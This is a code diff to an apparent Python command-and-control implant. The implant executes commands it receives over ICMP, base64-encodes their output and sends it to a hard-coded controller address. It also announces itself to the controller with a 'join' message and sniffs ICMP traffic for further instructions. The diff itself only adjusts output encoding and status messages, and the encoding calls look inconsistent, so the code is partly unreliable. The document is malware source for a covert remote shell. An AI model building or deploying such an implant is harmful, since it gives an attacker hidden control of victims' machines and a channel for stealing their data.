@@ -31,7 +31,7 @@ class Implant(Host):
                 output = check_output(cmd, stderr=STDOUT, timeout=3)
                 output = base64.b64encode(output.encode())
                 
-                self.send(self.controller_ip, "instruction", "response", output)
+                self.send(self.controller_ip, "instruction", "response", output.encode())
             except TimeoutExpired:
                 raise Exception
         except Exception:
@@ -39,11 +39,14 @@ class Implant(Host):
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
+    print("[ ICMP Sniffing Started ]")
+    
     implant = Implant(controller_ip="192.168.157.6")
     print(implant)
+
+    print(" [ Shellpack log ]")
     # Send join command
     implant.send(implant.controller_ip, "join", "hello how are you")
 
     # Start sniffing
-    print("[ ICMP Sniffing Started ]")
     sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
